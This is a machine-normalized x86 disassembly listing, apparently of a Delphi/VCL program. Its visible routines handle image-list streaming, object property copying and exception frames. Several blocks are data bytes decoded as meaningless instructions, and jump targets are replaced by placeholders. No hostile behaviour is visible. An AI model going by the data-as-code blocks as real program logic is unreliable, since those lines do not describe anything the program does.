pop ecx
pop ecx
pop ebp
retn
sub_48a660
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax esi
call sub_433ebc
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax esi
call sub_433ebc
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48a8e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_433c68
mov ebx eax
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebp - 0x18 ]
add eax ebx
cdq
push edx
push eax
mov eax esi
call sub_433c88
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_48a8c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4522e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
xor edx edx
xor eax eax
call sub_42e1b0
mov eax [ ebp - 0x4 ]
call sub_48acd8
xor eax eax
push ebp
push sub_48a8aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a8b1
mov eax [ ebp - 0xc ]
call sub_4055f0
mov eax [ ebp - 0x14 ]
call sub_4055f0
mov eax [ ebp - 0x4 ]
call sub_48acdc
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x38 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
imul eax ebx
call sub_42e1d8
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_451144
push eax
mov eax [ ebp - 0xc ]
call sub_451144
lea edx [ ebp - 0x30 ]
pop ecx
call sub_44d4f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
imul eax ebx
call sub_42e1d8
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_451144
push eax
mov eax [ ebp - 0x14 ]
call sub_451144
lea edx [ ebp - 0x30 ]
pop ecx
call sub_44d4f8
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_488f90
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_48a8f4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d1c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48a954
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_488d9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a95b
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
sub eax 0xffffffec
sub_48a95b
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_48aa88
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_433c88
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_434940
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_433c88
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_433c88
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d1c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48aa6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_433c88
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_488d9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
sub eax 0xffffffec
movzx eax [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_433c88
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_48aab8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_488e3c
mov eax edi
call sub_433c68
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
movzx ebx [ esp ]
movzx eax [ esp ]
shr eax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_433c88
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_48a660
cmp bl 0x49
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_488dd8
push eax
call ImageList_GetImageCount
push eax
mov eax esi
call sub_488dd8
push eax
call ImageList_SetImageCount
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_48a8f4
jmp r-xdata
call sub_485c78
call sub_485d84
test al al
jne r-xdata
sub_48ab68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d1c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48ac62
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_417244
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleW
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_488dd8
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_488dd8
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call sub_40bb70
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ac69
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
jmp r-xdata
sub_48acfc
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
mov edx esi
call sub_48a414
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_48ad4c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
lodsd [ esi ]
dec eax
add [ eax - 0x1ffb751 ] ch
lodsd [ esi ]
dec eax
add [ edx ] dh
scasb [ edi ]
dec eax
add [ esi - 0x52 ] ah
dec eax
add [ eax + 0x640048ae ] al
add [ eax ] al
add [ ecx + ebx * 8 ] dl
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_48b054
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov cl 0x48
add [ eax - 0x26ffb750 ] ch
mov al 0x48
add [ eax ] al
add [ eax ] al
add ch dh
mov al 0x48
add [ eax ] dl
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
push es
inc esi
dec ecx
outsb
js r-xdata
clc
mov ch 0x48
add [ eax ] cl
add [ eax ] al
add [ ebx ] cl
inc esi
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x2
add eax [ eax ]
or esi [ ecx + r-xdata ]
hlt
add [ eax ] al
sub_48b2c4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
mov ch 0x48
add [ eax - 0x4d ] bl
dec eax
add [ edi ] cl
mov ah 0x48
add [ ebx - 0x4c ] cl
dec eax
add [ edi - 0x4c ] bl
dec eax
add [ eax + eax ] ch
add [ eax - 0x53ffbd33 ] dh
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
int3
sub_48b986
inc ebx
add [ ecx + edx * 8 ] dh
inc ebx
add al bl
rol [ ebx ] 0x1
insb
rol [ ebx ] 0x1
pushfd
rol [ ebx ] 0x1
jo r-xdata
dec eax
add ah cl
into
dec eax
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add al ah
inc ebx
add ah bh
ror [ eax ] 0xf4
int3
sub_48bf34
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ eax ] 0x1c
add [ eax ] al
add al bh
salc
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ edi + ecx * 8 ] dl
inc ebx
add [ eax ] dl
iretd
sub_48c038
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43d004
test bl bl
jle r-xdata
mov edx esi
call sub_48c4d0
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_48c0a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c694
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_48c150
sub_48c0dc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48c06c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x34 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_430438
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x34 ]
mov ecx ebx
mov edx esi
call sub_430658
sub_48c124
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_407768
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_4070a8
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
sub_48c150
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_48c4d0
mov edx ebx
mov eax esi
call sub_48c4b0
sub_48c178
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_48c150
sub_48c1a4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4a21c4
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_40587c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_43d0a0
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_46d4a0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_48c1fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x5c ]
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4a21ec
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
call sub_43d0bc
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_46d4a0
dec eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_48c24c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] 0xffffffff
mov [ edi + 0x8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_48c2b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43c14c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x34 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
mov [ ebx + 0x38 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_48c454
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_48c324
push ebx
push esi
push edi
call sub_405bb4
mov ebx edx
mov edi eax
mov eax [ edi + 0x38 ]
call sub_4055f0
jmp r-xdata
mov esi [ edi + 0x34 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4306d0
call sub_4055f0
lea eax [ edi + 0x34 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43c198
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_405b5c
sub_48c37c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_48c3c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_430608
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_405830
mov edx edi
call sub_48c0dc
sub_48c420
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x3c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x38 ]
call sub_48a414
pop esi
pop ebx
retn
mov edx [ ebx + 0x38 ]
call sub_48a458
mov edx ebx
mov eax [ ebx + 0x3c ]
call sub_43c22c
sub_48c460
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_43c52c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x3c ]
jne r-xdata
cmp [ esi + 0x34 ] 0x0
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_48c4d0
sub_48c4b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_4303e0
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_43c22c
pop esi
pop ebx
retn
sub_48c4d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
xor ecx ecx
mov eax [ ebx + 0x34 ]
call sub_4307b0
test eax eax
jl r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_43c510
xor eax eax
mov [ esi + 0x5c ] eax
sub_48c4f8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebx + 0x34 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x2bc ] 0x0
je r-xdata
mov eax [ esi + 0x2bc ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_48c560
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
call sub_460bec
test al al
jne r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
call sub_494560
mov esi eax
movzx eax [ ebx + 0x4 ]
mov edx esi
call sub_45b168
mov ebp eax
test bp bp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x34 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov [ esp + 0x4 ] al
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov eax ebx
call sub_48cfa4
mov edx ebp
call sub_48d05c
inc eax
je r-xdata
sub_48c604
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_48c624
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_48c644
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
movzx eax [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x34 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x48 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
movzx edx [ edi + 0x94 ]
mov eax edi
call sub_48cb60
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x34 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_48cb60
sub_48c7e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43cfc0
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_48c834
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4055f0
mov eax [ esi + 0x9c ]
call sub_4055f0
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_48c038
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_48c88c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43139c
movzx edx [ ebx + 0x95 ]
mov edi esi
mov eax edi
call sub_48c998
mov edx [ ebx + 0x64 ]
mov eax edi
call sub_48c9f8
movzx edx [ ebx + 0x69 ]
mov eax edi
call sub_48ca58
movzx edx [ ebx + 0x6a ]
mov eax edi
call sub_48cb60
mov edx [ ebx + 0x6c ]
mov eax edi
call sub_48cbdc
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov edx [ ebx + 0x78 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x50 ]
movzx edx [ ebx + 0x70 ]
mov eax edi
call sub_48cc34
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_48cd4c
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_48cdac
mov eax ebx
call sub_48cfa4
mov edx eax
mov eax edi
call sub_48cfcc
movzx edx [ ebx + 0x84 ]
mov eax edi
call sub_48ce08
movzx edx [ ebx + 0x86 ]
mov eax edi
call sub_48ce6c
mov eax [ ebx + 0xc ]
mov [ edi + 0xc ] eax
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x38 ]
mov eax [ ebx + 0x88 ]
mov [ edi + 0x88 ] eax
mov eax [ ebx + 0x8c ]
mov [ edi + 0x8c ] eax
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_48c998
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x95 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x95 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x34 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4305a0
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4305a0
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
sub_48c9f8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_407768
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_4070a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_405830
test eax eax
je r-xdata
sub_48ca58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
